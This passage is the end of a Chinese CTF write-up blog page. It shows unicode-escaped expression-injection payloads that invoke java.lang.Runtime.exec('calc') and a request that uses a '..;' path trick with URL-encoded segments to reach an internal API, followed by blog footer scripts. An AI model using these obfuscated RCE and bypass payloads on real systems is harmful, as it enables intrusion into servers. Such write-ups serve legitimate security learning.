+{&#34;name&#34;:&#34;${\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0065\u0078\u0065\u0063\u0027\u002c\u0020\u0027\u0027\u002e\u0063\u006c\u0061\u0073\u0073\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0067\u0065\u0074\u004d\u0065\u0074\u0068\u006f\u0064\u0028\u0027\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0027\u0029\u002e\u0069\u006e\u0076\u006f\u006b\u0065\u0028\u006e\u0075\u006c\u006c\u0029\u002c\u0020\u0027\u0063\u0061\u006c\u0063\u0027\u0029}&#34;}
+</code></pre><p>请求包：</p>
+<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#61afef;font-weight:bold">POST</span> <span style="color:#e06c75">/api/external/..;/%69%6e%74%65%72%6e%61%6c/</span> <span style="color:#c678dd">HTTP</span><span style="color:#56b6c2">/</span><span style="color:#d19a66">1.1</span>
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">Host</span><span style="color:#56b6c2">:</span> 127.0.0.1:8080
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">Content-Type</span><span style="color:#56b6c2">:</span> application/json
+</span></span><span style="display:flex;"><span><span style="color:#e06c75">Content-Length</span><span style="color:#56b6c2">:</span> 932
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{<span style="color:#e06c75">&#34;name&#34;</span>:<span style="color:#98c379">&#34;${\u0027\u0027\u002e\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073\u0028\u0029\u002e\u0066\u006f\u0072\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u0078\u002e\u0073\u0063\u0072\u0069\u0070\u0074\u002e\u0053\u0063\u0072\u0069\u0070\u0074\u0045\u006e\u0067\u0069\u006e\u0065\u004d\u0061\u006e\u0061\u0067\u0065\u0072\u0027\u0029\u002e\u006e\u0065\u0077\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065\u0028\u0029\u002e\u0067\u0065\u0074\u0045\u006e\u0067\u0069\u006e\u0065\u0042\u0079\u004e\u0061\u006d\u0065\u0028\u0027\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u0027\u0029\u002e\u0065\u0076\u0061\u006c\u0028\u0027\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u002e\u0067\u0065\u0074\u0052\u0075\u006e\u0074\u0069\u006d\u0065\u0028\u0029\u002e\u0065\u0078\u0065\u0063\u0028\u0022\u0063\u0061\u006c\u0063\u0022\u0029\u0027\u0029}&#34;</span>}
+</span></span></code></pre></div><p>本文原载于<a class="link" href="https://0zhanya.github.io/"  target="_blank" rel="noopener"
+    >0ZHan&rsquo;s Blog</a>，遵循CC BY-NC-SA 4.0协议，复制请保留原文出处。</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctf/">CTF</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <script src='//unpkg.com/@waline/client@v2/dist/waline.js'></script>
+<link href='//unpkg.com/@waline/client@v2/dist/waline.css' rel='stylesheet'/>
+<div id="waline" class="waline-container"></div>
+<style>
+    .waline-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+        --waline-font-size: var(--article-font-size);
+    }
+    .waline-container .wl-count {
+        color: var(--card-text-color-main);
+    }
+</style><script>
+    
+    Waline.init({"dark":"html[data-scheme=\"dark\"]","el":"#waline","emoji":["https://npm.elemecdn.com/@waline/emojis@1.1.0/bmoji"],"lang":"zh-CN","locale":{"admin":"站长","sofa":"还没有人评论哦！快来抢沙发吧~"},"placeholder":"欢迎留下宝贵的评论！","requiredMeta":["name","email","url"],"serverURL":"https://data-table-e038f1l82-0zhanya.vercel.app/"});
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 0ZHan&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
